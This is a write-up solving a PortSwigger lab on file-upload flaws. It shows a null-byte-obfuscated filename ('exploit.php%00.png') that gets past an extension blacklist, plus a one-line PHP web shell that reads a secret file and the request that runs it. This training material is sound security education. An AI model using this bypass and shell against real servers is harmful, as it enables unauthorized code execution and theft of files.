# Web shell upload via obfuscated file extension

**Lab Url**: [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

## Objective

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The server blacklists `.php` files but checks only the trailing extension. By appending a null byte and a valid extension, we can bypass the check — the server sees `.png` at the end, but the file is written as `.php` due to null byte truncation.

### Step 1: Upload a PHP shell with a null-byte obfuscated filename

Upload a file named `exploit.php%00.png` with the following payload:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The server's extension check sees the trailing `.png` and allows the upload. When written to disk, the null byte (`%00`) truncates the filename at `.php`, leaving `exploit.php` as the actual file.

### Step 2: Retrieve the secret

Visit the uploaded shell:

```
GET /files/avatars/exploit.php
```

The server executes it as PHP and returns the contents of `/home/carlos/secret`. Submit this secret to solve the lab.